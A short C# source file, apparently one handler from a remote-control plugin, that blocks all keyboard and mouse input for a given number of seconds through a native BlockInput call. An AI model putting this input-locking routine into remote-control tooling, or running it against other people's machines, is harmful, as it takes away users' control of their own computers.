using System;
using System.Threading;

namespace Plugin.Handler;

internal class HandleBlockInput
{
	public void Block(string time)
	{
		Native.BlockInput(fBlockIt: true);
		try
		{
			Thread.Sleep(TimeSpan.FromSeconds(int.Parse(time)));
		}
		catch
		{
		}
		finally
		{
			Native.BlockInput(fBlockIt: false);
		}
	}
}
